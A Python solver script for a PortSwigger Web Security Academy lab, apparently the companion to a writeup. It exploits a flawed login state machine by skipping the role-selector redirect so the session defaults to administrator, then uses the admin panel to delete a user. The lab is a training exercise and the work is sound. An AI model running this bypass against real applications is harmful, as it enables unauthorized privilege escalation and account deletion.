#!/usr/bin/env python3
"""
Authentication bypass via flawed state machine
PortSwigger Web Security Academy -- Business Logic Vulnerabilities

Companion script for the writeup: 09-authentication-bypass-via-flawed-state-machine.md

What this does:
    Logs in as wiener:peter with follow_redirects disabled on the login POST
    -- the response is a 302 to /role-selector, which the script simply
    never requests. It captures the resulting session cookie and goes
    straight to the home page instead. The server's default for a session
    that never explicitly picked a role turns out to be the most privileged
    one, landing the session in the administrator role. From there it opens
    /admin and deletes carlos.

Usage:
    python 09-authentication-bypass-via-flawed-state-machine.py <lab-url>
    e.g. python 09-authentication-bypass-via-flawed-state-machine.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    c = httpx.Client(follow_redirects=True, timeout=15)

    csrf = _get_csrf(c, f"{lab_url}/login")
    c.post(f"{lab_url}/login", data={
        "csrf": csrf, "username": "wiener", "password": "peter"
    }, follow_redirects=False)
    print("[*] Logged in without following the 302 to /role-selector")

    c.get(f"{lab_url}/")
    print("[*] Requested the home page directly -- role-selector never visited")

    admin_r = c.get(f"{lab_url}/admin")
    del_url = re.search(r'href="(/admin/delete\?username=carlos)"', admin_r.text)
    if del_url:
        c.get(f"{lab_url}{del_url.group(1)}")
        print(f"[*] Deleted carlos via {del_url.group(1)}")

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- session defaulted to administrator when role-selector was skipped.")
    else:
        print("[-] Not solved yet -- confirm /admin was reachable without picking a role.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
